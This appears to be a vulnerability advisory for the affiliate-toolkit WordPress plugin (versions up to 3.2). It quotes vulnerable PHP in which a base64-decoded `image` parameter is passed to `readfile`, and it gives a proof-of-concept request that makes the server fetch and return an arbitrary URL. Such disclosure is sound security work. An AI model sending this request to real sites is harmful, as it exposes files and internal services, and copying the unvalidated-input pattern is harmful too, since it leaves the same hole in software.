### affiliate-toolkit

- **Application**: affiliate-toolkit <= 3.2

- **Threat Impact**: File disclosure, Sensitive data leakage

- **Code**: Tainted parameter `image` is base64 decoded then feed into sink `readfile` directly.

  File: `tools/atkp_imagereceiver.php`

  ```
  $url = ( isset( $_GET['image'] ) ) ? $_GET['image'] : '';
  $image_url = base64_decode( $url );
  ...
  readfile( $image_url );
  ```

- **POC**:
  1. Listen on 8080 on server side
  1. Send a get request to wp-content/plugins/affiliate-toolkit-starter/tools/atkp_imagereceiver.php?image=aHR0cDovL2xvY2FsaG9zdDo4MDgw&hash=dd4349f3bf4a552af419e12c282ba25a
  1. Receive a request on server side. The full response is also disclosed

